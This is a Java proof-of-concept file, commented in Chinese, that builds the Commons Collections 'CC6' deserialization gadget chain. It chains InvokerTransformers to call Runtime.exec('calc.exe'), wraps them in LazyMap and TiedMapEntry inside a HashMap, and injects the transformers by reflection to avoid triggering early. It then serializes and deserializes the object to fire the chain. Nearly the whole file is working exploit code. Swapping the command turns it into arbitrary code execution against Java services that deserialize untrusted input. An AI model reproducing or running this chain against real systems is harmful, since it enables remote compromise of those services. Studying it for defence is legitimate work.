package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Cc6Poc {

    public static void main(String[] args) throws Exception {

        //命令
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"})
        };
        //空chainedTransformer(payload)
        Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        //构造空利用链
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "test");
        /*
         * 为避免在构建利用链时时触发漏洞，选择先构建空利用链,然后再将transformers通过反射
         * 机制加载到空利用链对象hashtable中chainedTransformer的成员属性iTransformers上。
         * */
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);

        /*
         *清空LazyMap对象，否则反序列化时程序会执行到其他分支中而不会触发利用链
         *此语句会触发漏洞，原因未知
         * */
        lazyMap.clear();

        //序列化利用链
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        //反序列化测试
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}